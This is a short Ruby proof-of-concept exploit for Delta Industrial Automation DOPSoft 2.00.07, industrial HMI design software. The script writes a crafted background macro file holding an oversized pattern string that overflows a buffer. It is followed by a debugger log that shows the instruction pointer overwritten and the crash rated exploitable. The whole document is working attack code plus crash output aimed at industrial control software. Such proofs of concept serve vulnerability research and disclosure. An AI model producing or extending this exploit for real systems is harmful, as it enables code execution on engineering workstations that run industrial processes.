#!/usr/bin/env ruby
# DELTA_IA-HMI_DOPSoft-2-00-07-04_SW_TC-SC-EN-SP_20171214.zip
require 'rex'

macro =  "!DB = $282\n"
macro << "$90 = " + Rex::Text.pattern_create(4024) + "\n"
macro << "IF $90 == 1\n"
macro << "$91 == 1\n"
macro << "ENDIF\n"

fd = File.new('backgroundmacro.txt','wb')
fd.write(macro)
fd.close
__END__
(1270.5b0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files (x86)\Delta Industrial Automation\DOPSoft 2.00.07\DOPSoft.exe
eax=0019b98c ebx=00000001 ecx=0019ef80 edx=00c8ce33 esi=00c82050 edi=0019ee7c
eip=8db20900 esp=0019b97c ebp=0019b998 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210206
8db20900 ??              ???
0:000> !exploitable

!exploitable 1.6.0.0
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Data Execution Prevention Violation starting at Unknown Symbol @ 0xffffffff8db20900 called from DOPSoft+0x00000000004e1426 (Hash=0xc621e6e1.0xc2e736b3)

User mode DEP access violations are exploitable.

